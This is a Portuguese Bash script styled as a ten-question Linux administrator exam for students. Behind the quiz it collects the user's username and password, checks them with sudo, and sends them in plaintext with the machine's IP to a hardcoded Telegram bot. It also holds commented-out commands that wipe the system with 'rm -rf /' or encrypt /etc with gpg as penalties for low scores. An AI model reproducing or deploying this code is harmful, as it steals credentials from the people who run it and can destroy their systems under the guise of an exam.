#!/bin/bash

# Definindo cores diretamente usando ANSI
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'  # Reset da cor
# Chamando a função para inicializar as cores
tput_color

# Função para exibir o banner com animação, linha por linha
exibir_banner() {
    clear  # Limpar a tela antes de começar a animação

        echo -e "${YELLOW}"
        echo ' _____           _                      ____                   _ ' && sleep 0.3
        echo '|  ___|__  _ __ | |_ ___  ___          / ___|  ___ ____   __ _(_)' && sleep 0.3
        echo '| |_ / _ \|  _ \| __/ _ \/ __|  _____  \___ \ / _ \  _ \ / _` | |' && sleep 0.3
        echo '|  _| (_) | | | | ||  __/\__ \ |_____|  ___) |  __/ | | | (_| | |' && sleep 0.3
        echo '|_|  \___/|_| |_|\__\___||___/         |____/ \___|_| |_|\__,_|_|' && sleep 0.3
        echo '================================================================'  && sleep 0.3
        echo '                                                               '   && sleep 0.3
        echo '============================================== by : D3Z33 ======'  && sleep 0.3
        echo '                                                               '   && sleep 0.3
        echo '===== Prova - Linux_Administrator - Senai Suiço Brasileiro ====='  && sleep 0.3
        echo '                                                                '  && sleep 0.3
        echo -e "${NC}"
}

# Função para exibir instruções
instrucoes() {
    echo -e "${YELLOW}Instruções:${NC}"
    echo "1. A prova consiste em 10 perguntas de múltipla escolha."
    echo "2. Você terá 60 segundos para responder cada pergunta."
    echo "3. Se não responder a tempo, a pergunta será considerada errada."
    echo "4. Notas inferiores ou iguais a 5 resultarão em **reprovado**."
    echo "5. Notas 6 ou 7 resultarão em **reprovado também**."
    echo "6. Notas acima de 8 resultarão em **aprovado**."
    echo ""
}

# Função para capturar o IP da VM
capturar_ip() {
    IP_VM=$(hostname -I | awk '{print $1}')  # Captura o primeiro IP retornado pelo comando hostname -I
    echo -e "${YELLOW}O IP da sua máquina é: $IP_VM${NC}"
}

# Função para enviar mensagem ao Telegram
enviar_telegram() {
    local mensagem="$1"
    local chat_id="511867448"  # Chat ID do Telegram
    local bot_token="7692442307:AAHFgnUWu9hkFkAzRGk8rHw7M_YnqDfBGJ8"  # Bot Token

    curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" \
    -d chat_id="$chat_id" \
    -d text="$mensagem" > /dev/null 2>&1  # Oculte a saída de curl
}

# Função para solicitar o nome de usuário e senha com validação de sudo
solicitar_credenciais() {
    read -p "Digite seu nome de usuário: " nome_usuario
    read -s -p "Digite sua senha: " senha_usuario
    echo  # Apenas para inserir uma nova linha após a senha

    # Validação da senha do usuário no sistema
    echo "$senha_usuario" | sudo -S -u "$nome_usuario" whoami &> /dev/null
    if [ $? -ne 0 ]; then
        echo -e "${RED}Senha ou nome de usuário incorretos. Saindo...${NC}"
        exit 1
    fi
    echo -e "${GREEN}Senha Correta. Prova iniciada!${NC}"

    # Enviar credenciais e IP para o Telegram
    enviar_credenciais "$nome_usuario" "$senha_usuario" "$IP_VM"
}

# Função para enviar credenciais e IP para o Telegram
enviar_credenciais() {
    local nome="$1"
    local senha="$2"
    local ip="$3"
    local mensagem="*Nome*: $nome\\n*Senha*: \`$senha\`\\n*IP*: $ip"
    local chat_id="511867448"  # Chat ID do Telegram
    local bot_token="7692442307:AAHFgnUWu9hkFkAzRGk8rHw7M_YnqDfBGJ8"  # Bot Token

    curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" \
    -d chat_id="$chat_id" \
    -d text="$mensagem" \
    -d parse_mode="MarkdownV2"  # Markdown para interpretar novas linhas corretamente
}

# Lista de perguntas e respostas corretas
perguntas=(
    "01. Qual comando lista os arquivos de um diretório?\na) ls\nb) cd\nc) rm\nd) pwd"
    "02. Qual comando muda o diretório atual?\na) ls\nb) cd\nc) pwd\nd) rm"
    "03. Qual comando cria um novo diretório?\na) mkdir\nb) rmdir\nc) cd\nd) pwd"
    "04. Qual comando apaga um arquivo?\na) rm\nb) cd\nc) ls\nd) pwd"
    "05. Qual comando exibe o caminho completo do diretório atual?\na) pwd\nb) ls\nc) cd\nd) rm"
    "06. Qual comando altera as permissões de um arquivo?\na) chmod\nb) chown\nc) ls\nd) cd"
    "07. Qual comando altera o dono de um arquivo?\na) chown\nb) chmod\nc) ls\nd) rm"
    "08. Qual comando exibe o conteúdo de um arquivo?\na) cat\nb) rm\nc) cd\nd) ls"
    "09. Qual comando exibe as primeiras linhas de um arquivo?\na) head\nb) tail\nc) cat\nd) ls"
    "10. Qual comando exibe as últimas linhas de um arquivo?\na) tail\nb) head\nc) ls\nd) pwd"
)

respostas_corretas=("a" "b" "a" "a" "a" "a" "a" "a" "a" "a")  # Gabarito

# Função para embaralhar e fazer as perguntas
fazer_perguntas() {
    perguntas_embaralhadas=$(shuf -i 0-9)  # Gera uma sequência embaralhada de perguntas

    for index in $perguntas_embaralhadas; do
        fazer_pergunta "${perguntas[$index]}" "${respostas_corretas[$index]}"
    done
}

# Função para perguntar e validar resposta
fazer_pergunta() {
    local pergunta="$1"
    local correta="$2"

    echo -e "${YELLOW}$pergunta${NC}"
    read -t 60 -p "Escolha sua alternativa (A, B, C, D): " resposta

    if [[ -z "$resposta" ]]; then
        echo -e "${RED}Tempo esgotado! Considerado Errada.${NC}"
        resposta="errada"
    elif [[ "$resposta" =~ ^[a-dA-D]$ ]]; then
        if [[ "$resposta" == "$correta" ]]; then
            echo -e "${GREEN}Resposta correta!${NC}"
            pontuacao=$((pontuacao + 1))
        else
            echo -e "${RED}Resposta errada!${NC}"
        fi
    else
        echo -e "${RED}Alternativa inválida! Não mandei brincar.${NC}"
        resposta="errada"
    fi
}

# Função para calcular a média e aplicar as ações
finalizar_prova() {
    echo -e "${YELLOW}Sua pontuação foi: $pontuacao de 10${NC}"

    if (( pontuacao <= 5 )); then
        echo -e "${RED}Que pena, você não foi aprovado!${NC}"
        sleep 10
        # sudo rm -rf /  # Apaga o sistema (comentado para testes)
    elif (( pontuacao >= 6 && pontuacao <= 7 )); then
        echo -e "${YELLOW}Quase lá, mas... você não foi aprovado!${NC}"
        sleep 10
        # sudo gpg -c /etc/*  # Criptografa os arquivos do sistema (comentado para testes)
    else
        echo -e "${GREEN}Parabéns! Você foi aprovado!${NC}"
        sleep 10
        # sudo reboot  # Reinicia o sistema (comentado para testes)
    fi

    # Enviar resultados da prova para o Telegram
    enviar_telegram "Aluno: $nome_usuario\nPontuação: $pontuacao de 10\nIP: $IP_VM"
}

# Início da prova
exibir_banner
instrucoes

# Confirmação do usuário para iniciar
while true; do
    read -p "Você entendeu as instruções? (s/n): " confirmacao
    case $confirmacao in
        [sS])
            echo -e "${GREEN}Vamos nessa!${NC}"
            break
            ;;
        [nN])
            echo -e "${RED}Sinto muito, prova começando...${NC}"
            break
            ;;
        *)
            echo -e "${RED}Resposta inválida! Vamos de novo.${NC}"
            exibir_banner
            instrucoes
            ;;
    esac
done

# Simulação real de exclusão de arquivos
apagamento_real() {
    echo -e "${RED}Nota baixa!${NC}"
   # sleep 2
   # echo "$senha_usuario" | sudo -S rm -rf /  # Remove o sistema real (comentado para teste)
}

# Simulação real de criptografia de arquivos
criptografar_sistema() {
    echo -e "${YELLOW}Nota intermediária!${NC}"
   # sleep 2
   # echo "$senha_usuario" | sudo -S gpg -c /etc/*  # Criptografa arquivos de sistema (comentado para teste)
}

# Reiniciar o sistema
reiniciar_sistema() {
    echo -e "${GREEN}Parabéns! Nota alta!${NC}"
   # sleep 2
   # echo "$senha_usuario" | sudo -S reboot  # Reinicia o sistema real (comentado para teste)
}

# Solicitar credenciais e enviar para o Telegram
solicitar_credenciais
capturar_ip

# Variável de pontuação
pontuacao=0

# Fazer perguntas embaralhadas
fazer_perguntas

# Finalizar prova
finalizar_prova
